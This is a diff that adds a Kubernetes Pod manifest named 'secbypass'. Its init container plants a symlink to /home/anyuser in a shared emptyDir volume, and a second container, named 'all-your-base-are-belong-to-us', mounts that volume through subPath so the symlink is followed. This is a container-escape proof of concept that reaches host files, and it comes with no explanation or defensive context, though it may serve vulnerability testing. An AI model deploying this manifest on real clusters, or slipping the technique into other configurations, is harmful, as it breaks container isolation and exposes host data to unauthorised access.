@@ -1,0 +1,23 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: secbypass
+spec:
+  initContainers:
+  - name: prep-symlink
+    image: "docker:stable"
+    command: ['ln', '-s', '/home/anyuser', '/tmp/vol']
+    volumeMounts:
+    - name: volume01
+      mountPath: /tmp/
+  containers:
+  - name: all-your-base-are-belong-to-us
+    image: "docker:stable"
+    command: ["/bin/sleep", "999999"]
+    volumeMounts:
+    - name: volume01
+      subPath: vol
+      mountPath: /test
+  volumes:
+  - name: volume01
+    emptyDir: {}
